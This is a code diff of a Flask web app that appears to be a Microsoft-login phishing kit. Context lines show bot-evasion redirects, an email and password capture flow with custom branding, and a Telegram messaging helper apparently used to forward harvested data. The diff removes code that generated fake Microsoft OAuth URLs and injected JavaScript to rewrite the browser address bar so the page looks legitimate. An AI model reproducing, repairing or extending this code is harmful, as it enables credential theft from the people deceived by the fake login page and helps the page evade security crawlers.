@@ -124,94 +124,6 @@ def bot_error_handler():
     # If somehow reached here, redirect to index
     return redirect(url_for('index'))
 
-# Add helper function for generating Microsoft OAuth URL
-def generate_microsoft_oauth_url():
-    """Generate Microsoft OAuth URL with session and user info"""
-    try:
-        session_id = str(uuid.uuid4())
-        ip = request.remote_addr
-        user_agent = request.headers.get('User-Agent', '')
-        block_ua = '1' if is_bot_request() else '0'
-        req_id = str(uuid.uuid4())
-        
-        # Generate components
-        sha1_session = sha1(session_id.encode()).hexdigest()
-        payload = f"{ip}{user_agent}{block_ua}{req_id}{sha1_session}"
-        encoded_payload = base64.b64encode(payload.encode()).decode()
-        ai_hash = sha1(encoded_payload.encode()).hexdigest()
-        
-        # Build OAuth URL
-        oauth_url = f"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id={sha1_session}&ai={ai_hash}"
-        return oauth_url
-    except Exception as e:
-        print(f"Error generating OAuth URL: {str(e)}")
-        return None
-
-# Modify existing route handlers to include OAuth URL and JavaScript:
-@app.after_request 
-def add_oauth_header(response):
-    """Add Microsoft OAuth URL to response headers and inject JS"""
-    try:
-        if response.mimetype == "text/html":
-            oauth_url = generate_microsoft_oauth_url()
-            if oauth_url:
-                response.headers['X-MS-OAuth-URL'] = oauth_url
-                
-                # Inject JavaScript to handle URL updates
-                script = """
-                <script>
-                function updateAddressBar() {
-                    const oauth_url = document.querySelector('meta[name="ms-oauth-url"]')?.content;
-                    if (oauth_url) {
-                        const current = new URL(window.location.href);
-                        current.searchParams.set('ms_oauth', oauth_url);
-                        window.history.replaceState({}, '', current.toString());
-                    }
-                }
-                document.addEventListener('DOMContentLoaded', updateAddressBar);
-                </script>
-                """
-                
-                # Insert script before </body>
-                if b'</body>' in response.data:
-                    response.data = response.data.replace(
-                        b'</body>', 
-                        script.encode() + b'</body>'
-                    )
-    except Exception as e:
-        print(f"Error adding OAuth header: {str(e)}")
-    return response
-
-# Add template context processor for OAuth URL:
-@app.context_processor 
-def utility_processor():
-    """Add helper functions to template context"""
-    def get_oauth_url():
-        url = generate_microsoft_oauth_url()
-        if not url:
-            return ''
-        return url
-    return dict(get_oauth_url=get_oauth_url)
-
-# Add to all template files (*.html):
-"""
-<!-- Add meta tag for OAuth URL -->
-<meta name="ms-oauth-url" content="{{ oauth_url }}">
-
-<!-- Add JavaScript to handle URL updates -->
-<script>
-function updateAddressBar() {
-    const oauth_url = document.querySelector('meta[name="ms-oauth-url"]')?.content;
-    if (oauth_url) {
-        const current = new URL(window.location.href);
-        current.searchParams.set('ms_oauth', oauth_url);
-        window.history.replaceState({}, '', current.toString());
-    }
-}
-document.addEventListener('DOMContentLoaded', updateAddressBar);
-</script>
-"""
-
 async def send_telegram_message(message):
     """Sends a message to the Telegram chat."""
     try:
@@ -1022,9 +934,7 @@ def index():
             session.clear()
             return redirect(url_for('bot_error_handler'))
 
-        oauth_url = generate_microsoft_oauth_url()
-        # session.clear() # This line is causing the issue
-        return render_template("index.html", oauth_url=oauth_url)
+        return render_template("index.html")
             
     except Exception as e:
         print(f"Error in index route: {str(e)}")
@@ -1035,7 +945,6 @@ def password():
     if is_bot_request():
         return redirect(url_for('bot_error_handler'))
 
-    oauth_url = generate_microsoft_oauth_url()
     email = request.args.get('email') or request.form.get('email') or session.get('email')
     if not email:
         return redirect(url_for('index'))
@@ -1048,7 +957,6 @@ def password():
             email=email,
             banner=session.get('banner'),
             background=session.get('background'),
-            oauth_url=oauth_url,
             error=request.args.get('error')
         )
     except Exception as e:
